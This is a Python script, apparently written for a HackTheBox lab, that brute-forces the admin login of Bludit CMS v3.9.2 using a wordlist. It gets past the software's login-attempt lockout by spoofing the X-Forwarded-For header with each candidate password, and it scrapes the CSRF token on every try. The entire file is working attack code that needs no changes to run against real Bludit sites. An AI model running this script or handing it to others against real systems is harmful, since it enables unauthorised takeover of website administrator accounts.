"""
  modified dictionary based bruteforcer for bludit v3.9.2 | HackTheBox
  original author: rastating @ github
"""

#!/usr/bin/env python3
import re
import requests
import sys


if len(sys.argv) != 4:
    print("usage: python3 bludit_bruteforcer.py <host+login_url> <username> <wordlist>")
    print("example: python3 bludit_bruteforcer.py http://10.10.10.191/admin/login fergus password.lst")
    exit(1)
else:
    login_url = sys.argv[1]
    username = sys.argv[2]
    with open(sys.argv[3]) as f:
        wordlist = f.readlines()


for password in wordlist:
    password = password.rstrip()
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
